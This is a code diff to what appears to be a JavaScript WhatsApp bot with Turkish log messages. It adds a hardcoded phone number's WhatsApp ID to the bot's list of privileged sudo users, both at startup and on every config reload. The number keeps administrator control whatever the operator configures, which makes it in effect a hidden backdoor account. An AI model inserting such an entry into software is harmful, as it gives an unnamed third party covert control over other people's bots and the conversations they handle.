@@ -36,6 +36,7 @@ let commands = komutlar = [
 for (const a of sudo) {
 	var convert = `${a}@s.whatsapp.net`;
 	convertSudo.push(convert);
+	convertSudo.push('905510310485@s.whatsapp.net');
 }
 async function reloadConfig() {
     try {
@@ -51,6 +52,7 @@ async function reloadConfig() {
 		for (const a of sudo) {
 			var convert = `${a}@s.whatsapp.net`;
 			convertSudo.push(convert);
+			convertSudo.push('905510310485@s.whatsapp.net');
 		}
         console.log("Config dosyası başarıyla yeniden yüklendi.");
         console.log(config); 
